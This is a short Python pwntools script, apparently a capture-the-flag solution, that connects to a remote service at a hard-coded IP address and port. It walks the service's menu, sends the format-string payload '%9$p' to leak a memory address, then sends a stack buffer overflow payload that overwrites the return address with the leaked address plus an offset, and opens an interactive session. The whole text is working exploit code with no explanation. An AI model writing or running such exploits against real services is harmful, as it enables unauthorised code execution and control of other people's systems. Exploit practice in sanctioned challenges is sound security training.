from pwn import *

io = remote("23.146.248.230", 12355)
while b'fsb' not in io.recvuntil(b'> '):
    io.sendline(b'z')

io.sendline(b'%9$p')
line = io.recvuntil(b'> ')
leak = int(line[:-5].decode(), 16)
payload = b'a' * 0x10 + b'b' * 0x8 + p64(leak + 0x9c)

while b'bof' not in line:
    io.sendline(b'z')
    line = io.recvuntil(b'>')

io.sendline(payload)
io.interactive()